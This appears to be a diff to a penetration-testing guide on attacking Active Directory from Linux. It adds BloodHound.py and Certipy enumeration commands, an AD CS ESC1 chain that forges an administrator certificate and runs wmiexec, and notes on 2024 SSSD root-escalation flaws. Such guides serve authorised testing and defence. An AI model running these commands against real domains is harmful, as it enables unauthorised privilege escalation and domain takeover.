@@ -18,6 +18,31 @@ You can also check the following page to learn **other ways to enumerate AD from
 ../../network-services-pentesting/pentesting-ldap.md
 {{#endref}}
 
+---
+
+### Modern cross-platform ingestors
+
+The classical Windows‐only **SharpHound** collector has several mature, actively-maintained Linux alternatives that can be executed directly from a shell on a domain-joined host or from an out-of-domain attacker box:
+
+* **BloodHound.py** – pure-Python BloodHound ingestor that relies only on Impacket. It supports the newest Neo4j/GraphQL based Community-Edition schema and can run entirely from Linux with a command such as:
+
+  ```bash
+  python3 -m pip install bloodhound # or git clone https://github.com/dirkjanm/BloodHound.py
+  bloodhound-python -u alice -p "P@ssw0rd" -d HACKTRICKS.LOCAL -gc HACKTRICKS.LOCAL \
+                    -ns 10.10.10.1 -dns 10.10.10.1 -c All,ACL --zip
+  # Upload the ZIP file to the BloodHound UI (or use `--upload` when reachable)
+  ```
+
+* **Certipy** ≥ 4.0 – besides abusing AD CS (see next section) it contains an *`find`* and *`graph`* module that quickly identifies vulnerable certificate templates and privileges from Linux. Example enumeration:
+
+  ```bash
+  certipy  -u alice -p "P@ssw0rd" -domain hacktricks.local -target dc.hacktricks.local find
+  ```
+
+These tools generate JSON/ZIP data compatible with BloodHound Community-Edition (Neo4j or SQLite back-end) and therefore allow full path-finding without ever touching a Windows binary.  
+For enterprise environments that block unsigned executables on workstations, being able to collect data from a privileged Linux host (jump-box, container, WSL, …) is extremely convenient.
+
+
 ### FreeIPA
 
 FreeIPA is an open-source **alternative** to Microsoft Windows **Active Directory**, mainly for **Unix** environments. It combines a complete **LDAP directory** with an MIT **Kerberos** Key Distribution Center for management akin to Active Directory. Utilizing the Dogtag **Certificate System** for CA & RA certificate management, it supports **multi-factor** authentication, including smartcards. SSSD is integrated for Unix authentication processes. Learn more about it in:
@@ -25,6 +50,47 @@ FreeIPA is an open-source **alternative** to Microsoft Windows **Active Director
 {{#ref}}
 ../freeipa-pentesting.md
 {{#endref}}
+
+## Abusing Active Directory Certificate Services (AD CS) from Linux
+
+Microsoft’s certificate infrastructure is nowadays one of the fastest ways to obtain **Domain Admin** from a low-privileged account.  
+`Certipy` implements (and frequently updates) the research from Will Schroeder & Lee Christensen directly in Python, so everything can be performed from Linux:
+
+```bash
+# enumerate vulnerable templates and misconfigurations
+certipy find -u user -p 'Spring2025!' -domain hacktricks.local -target dc.hacktricks.local
+
+# request a certificate for ESC1 template and export as PFX
+certipy req  -u user@hacktricks.local -p 'Spring2025!' -ca hacktricks-CA \
+            -template ESC1 -upn 'administrator@hacktricks.local' -tcp 445
+
+# use the certificate to obtain a TGT and perform PTT
+certipy auth -pfx user_ESC1.pfx
+export KRB5CCNAME=administrator.ccache
+impacket-wmiexec administrator@hacktricks.local -k -no-pass 'whoami'
+```
+
+If `ESC1/ESC2/ESC3` misconfigurations are not present, `Certipy exploit` automates *NTLM relay* to the *ADCS HTTP enrolment endpoints* (❰/certsrv❱) from Linux, providing an end-to-end path similar to **PetitPotam ➜ ntlmrelayx ➜ adcs** but without requiring any Windows hosts.
+
+For detailed theory check:
+
+{{#ref}}
+../../windows-hardening/active-directory-methodology/ad-certificates/README.md
+{{#endref}}
+
+## Recent SSSD privilege-separation vulnerabilities (2024)
+
+In December 2024 the SUSE Security Team published a deep dive on **SSSD 2.10 privilege separation**, uncovering several weaknesses that allowed a local *`sssd`* user (or an attacker who compromised that account) to:
+
+* load **arbitrary shared objects** through the `LDB_MODULES_PATH` environment variable in *`sssd_pam`*, effectively executing code as **root**.
+* perform **symlink attacks** against `/var/lib/sssd` and `/var/log/sssd` during `systemctl restart sssd` because the service unit executes recursive `chown/chmod` operations as root without `--no-dereference`.
+
+Distributions that package SSSD with privilege separation (Arch, upcoming Fedora, some enterprise distros) were affected.  
+Upstream released **SSSD 2.10.1** and hardened the unit file, but many servers in the wild remain un-patched.
+
+☑️ If you find a Linux host joined to AD, always verify the installed SSSD version and service file permissions – exploiting these issues may yield instant root **and** access to the local *KCM* database containing Kerberos tickets.
+
+---
 
 ## Playing with tickets
 
@@ -122,8 +188,7 @@ crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDO
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 - [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)
+- [https://github.com/dirkjanm/BloodHound.py](https://github.com/dirkjanm/BloodHound.py)
+- [https://security.opensuse.org/2024/12/19/sssd-lacking-privilege-separation.html](https://security.opensuse.org/2024/12/19/sssd-lacking-privilege-separation.html)
 
 {{#include ../../banners/hacktricks-training.md}}
-
-
-
